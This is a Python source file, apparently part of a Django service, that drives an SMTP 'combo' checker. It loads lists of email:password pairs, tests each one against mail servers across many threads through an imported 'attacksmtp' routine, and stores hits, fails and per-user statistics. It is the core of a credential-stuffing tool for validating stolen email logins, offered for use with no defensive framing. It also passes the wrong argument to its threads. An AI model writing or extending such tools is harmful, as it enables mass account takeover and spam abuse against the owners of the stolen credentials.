import sys
import threading
from queue import Queue
from time import sleep

from root.logger import getLogger
from ..models import SMTPCheckResult, SMTPCombo, SMTPStatistics

from .inc_attacksmtp import smtpchecker
from .inc_comboloader import comboloader


targets_total = int(0)
targets_left = int(0)
hits = int(0)
fails = int(0)

checker_queue = Queue()

logger = getLogger(__name__)



def checker_thread(default_timeout, user_id):
    '''
    Function for a single thread which performs the main checking process.

    :param float default_timeout: timeout for server connection
    :return: None
    '''

    global targets_left
    global hits
    global fails

    while True:
        target = str(checker_queue.get())
        target_email, target_password = target.split(':')

        try:
            combo = SMTPCombo.objects.filter(email=target_email, password=target_password, user_id=user_id).first()

            result = smtpchecker(default_timeout, target)

            status = 'hit' if result else 'fail'
            SMTPCheckResult.objects.create(combo=combo, user_id=user_id, status=status)

            if result:
                hits += 1
            else:
                fails += 1

        except Exception as e:
            logger.error(f"Error in checker_thread: {e}")

        finally:
            targets_left -= 1
            checker_queue.task_done()

def checker(default_threads, default_timeout, default_email, file_content, user_id):
    '''
    Function to control the import of combos, to start threads etc.

    :param int default_threads: amount of threads to use
    :param float default_timeout: timeout for server-connections
    :param str default_email: users's email for test-messages (SMTP only)
    :param str combofile: textfile with combos to import
    :return: True (no errors occurred), False (errors occurred)
    '''
    global targets_total
    global targets_left
    combos_available = False
    try:
        combos = comboloader(file_content, user_id)
    except:
        combos = []
    targets_total = len(combos)
    targets_left = targets_total
    if targets_total > 0:
        combos_available = True
        
    if combos_available == True:
        for _ in range(default_threads):
            single_thread = threading.Thread(
                target=checker_thread,
                args=(default_timeout,default_email),
                daemon=True
            )
            single_thread.start()
        for target in combos:
            checker_queue.put(target)
            
        checker_queue.join()
        sleep(3.0)
        
    stats, created = SMTPStatistics.objects.get_or_create(user_id=user_id)
    stats.total_combos += targets_total
    stats.total_hits += hits
    stats.total_fails += fails
    stats.save()
